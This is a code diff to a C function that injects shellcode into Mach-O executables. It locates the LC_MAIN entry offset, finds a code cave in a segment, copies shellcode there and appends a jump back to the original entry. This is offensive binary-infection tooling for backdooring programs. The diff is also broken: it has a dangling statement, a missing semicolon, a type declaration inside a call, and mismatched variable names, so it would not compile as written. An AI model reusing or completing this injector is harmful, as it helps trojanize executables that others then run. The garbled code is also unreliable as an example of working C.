@@ -1,6 +1,7 @@
 int binject_MACH-O(char *file,char *shellcode)
 {
-   uint32_t size;
+   
+   uint32_t size,oryginal_entry;
    FILE *f;
   f=fopen(file,"r");
   fseek(f,0,SEEK_END);
@@ -9,6 +10,7 @@ int binject_MACH-O(char *file,char *shellcode)
    char *file_buffer = calloc(1,size);
   fread(file_buffer,1,size,f);
 	struct mach_header *header= (struct mach_header*)file_buffer;
+	oryginal_entry
 	char *address=file_buffer;
 	if(header->magic==MH_MAGIC_64)
 	{
@@ -28,6 +30,11 @@ int binject_MACH-O(char *file,char *shellcode)
 for(uint32_t a=0;a<header->ncmds;a++)
  {
 					load_command *cmd=(struct load_command*)address;
+     if(loadCommand->cmd== LC_MAIN)
+     {
+	   struct entry_point_command *entryCommand = (struct entry_point_command*)address;
+		oryginal_entry=entryCommand->entryOff;     
+      }
      if (loadCommand->cmd == LC_SEGMENT)
         {
             struct segment_command *segmentCommand = (struct segment_command*)address;
@@ -46,7 +53,7 @@ for(uint32_t a=0;a<header->ncmds;a++)
 			    sclen+=5;
 			if(sclen<cavelen)
 			{
-				char *shellcodefixed = ApplySufixJumpIntel64(shellcode);
+				char *shellcodefixed = ApplySuffixJmpIntel64(shellcode,caveOffset,uint32_t entry_point,0) 
 				memcpy(file_buffer+cave_offset,shellcodefixed,sclen);
 				 fwrite(file_buffer,1,size,f);
 				 free(shellcodefixed);
@@ -57,6 +64,7 @@ for(uint32_t a=0;a<header->ncmds;a++)
                     }
                     sectionAddress += sizeof(struct section);
                 }
+	
             }
         }
 			       
